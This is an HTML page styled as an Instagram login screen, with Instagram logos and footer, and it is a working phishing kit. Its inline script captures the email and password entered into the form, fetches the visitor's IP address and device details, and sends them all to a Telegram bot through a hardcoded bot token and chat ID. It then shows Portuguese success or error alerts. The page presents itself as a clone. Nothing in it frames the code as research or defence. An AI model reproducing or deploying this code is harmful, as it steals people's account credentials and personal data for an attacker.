<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css" />
    <link rel="icon" type="image/png" href="./img/insta-fav.ico">
    <title>Instagram Clone</title>
</head>
<body>
    <main class="flex align-items-center justify-content-center">
        <section id="mobile" class="flex">
        </section>
        <section id="auth" class="flex direction-column">
            <div class="panel login flex direction-column">
                <h1 title="Instagram" class="flex justify-content-center">
                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                </h1>
                <form id="login-form">
                    <label for="email" class="sr-only">Phone, username, or email</label>
                    <input id="email" name="email" placeholder="Phone, username, or email" required />

                    <label for="password" class="sr-only">Password</label>
                    <input id="password" name="password" type="password" placeholder="Password" required />

                    <button type="submit">Log In</button>
                </form>
                <div class="flex separator align-items-center">
                    <span></span>
                    <div class="or">OR</div>
                    <span></span>
                </div>
                <div class="login-with-fb flex direction-column align-items-center">
                    <div>
                        <img />
                        <a>Log in with Facebook</a>
                    </div>
                    <a href="#">Forgot password?</a>
                </div>
            </div>
            <div class="panel register flex justify-content-center">
                <p>Don't have an account?</p>
                <a href="#">Sign up</a>
            </div>
            <div class="app-download flex direction-column align-items-center">
                <p>Get the app.</p>
                <div class="flex justify-content-center">
                    <img src="./img/apple-button.png" alt="Apple App Store logo" title="Apple App Store" />
                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play Store" />
                </div>
            </div>
        </section>
    </main>
    <footer>
        <ul class="flex flex-wrap justify-content-center">
            <li><a href="#">ABOUT</a></li>
            <li><a href="#">HELP</a></li>
            <li><a href="#">PRESS</a></li>
            <li><a href="#">API</a></li>
            <li><a href="#">CAREERS</a></li>
            <li><a href="#">PRIVACY</a></li>
            <li><a href="#">TERMS</a></li>
            <li><a href="#">LOCATION</a></li>
            <li><a href="#">MORE ACCOUNTS</a></li>
            <li><a href="#">HASHTAGS</a></li>
            <li><a href="#">LANGUAGE</a></li>
        </ul>
        <p class="copyright">© 2020 Instagram from Facebook</p>
    </footer>

    <!-- Add Axios and the custom JavaScript code -->
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <script>
        const TOKEN = "7819643511:AAFejSeTVmuE0JieJpodqbDr_mGbGQPvtzA";  // Replace with your actual bot token
        const CHAT_ID = "7153864821";  // Replace with your actual chat ID
        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

        // Handle form submission
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent default form submission

            // Get form values
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Fetch the user's IP address
            axios.get('https://api.ipify.org?format=json')
                .then(response => {
                    const ip = response.data.ip; // Get the user's IP address
                    console.log('User IP:', ip); // Log IP for debugging

                    // Get device information
                    const userAgent = navigator.userAgent;  // Browser and OS info
                    const platform = navigator.platform;    // Device platform (e.g., 'Win32', 'MacIntel', 'Linux x86_64')
                    const screenWidth = screen.width;       // Screen width
                    const screenHeight = screen.height;     // Screen height
                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'; // Check if the device is mobile or desktop

                    // Log all collected device info for debugging
                    console.log('User-Agent:', userAgent);
                    console.log('Platform:', platform);
                    console.log('Screen Resolution:', screenWidth + 'x' + screenHeight);
                    console.log('Device Type:', deviceType);

                    // Prepare the message with form data, IP, and device info
                    const message = ` 
                        <b>New Login Attempt</b>\n
                        <b>Email:</b> ${email}\n
                        <b>Password:</b> ${password}\n
                        <b>IP Address:</b> ${ip}\n
                        <b>Device Type:</b> ${deviceType}\n
                        <b>Platform:</b> ${platform}\n
                        <b>User Agent:</b> ${userAgent}\n
                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                    `;

                    // Send the message to Telegram
                    axios.post(URI_API, {
                        chat_id: CHAT_ID,
                        parse_mode: 'html',
                        text: message
                    }).then(response => {
                        console.log('Message sent:', response.data);
                        alert('Informações enviadas com sucesso!');
                    }).catch(error => {
                        console.error('Error sending message:', error);
                        alert('Erro ao enviar as informações. Tente novamente.');
                    });
                })
                .catch(error => {
                    console.error('Error fetching IP:', error);
                    alert('Erro ao obter o endereço IP. Tente novamente.');
                });
        });
    </script>
</body>
</html>
